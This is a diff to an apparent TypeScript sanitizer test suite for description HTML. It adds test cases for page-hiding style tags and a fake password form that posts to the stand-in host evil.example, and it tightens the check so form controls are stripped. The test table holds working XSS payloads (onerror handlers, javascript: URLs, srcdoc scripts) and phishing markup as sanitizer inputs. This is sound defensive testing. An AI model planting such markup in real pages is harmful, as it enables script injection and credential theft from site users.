@@ -64,6 +64,12 @@ const unsafeDescriptions: [string, string][] = [
     ['MathML', '<math><mtext><img src="/missing.png" onerror="alert(1)"></mtext></math>'],
     ['iframe srcdoc', '<iframe srcdoc="<script>alert(1)</script>" src="javascript:alert(1)"></iframe>'],
     ['script and object', '<script>alert(1)</script><object data="javascript:alert(1)"></object><embed src="/active">'],
+    ['document-wide styles', '<p>Rate us</p><style>body{display:none}</style>'],
+    [
+        'form controls',
+        '<p>Rate us</p><form action="https://evil.example/c"><input type="password">' +
+            '<button>Send</button><textarea>Secret</textarea><select><option>Choice</option></select></form>',
+    ],
     [
         'malformed markup',
         '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">',
@@ -77,7 +83,11 @@ describe.each(descriptionRenderers)('$name description HTML boundary', ({ render
         test.each(unsafeDescriptions)('sanitizes %s', (_, description) => {
             const { container } = render(renderDescription(description, contentType))
             const body = container.querySelector(selector)!
-            expect(body.querySelector('script, iframe, object, embed, svg, math, style')).toBeNull()
+            expect(
+                body.querySelector(
+                    'script, iframe, object, embed, svg, math, style, form, input, button, textarea, select'
+                )
+            ).toBeNull()
             for (const element of body.querySelectorAll('*')) {
                 for (const attr of element.attributes) {
                     expect(attr.name).not.toMatch(/^on|^srcdoc$|^xlink:/i)
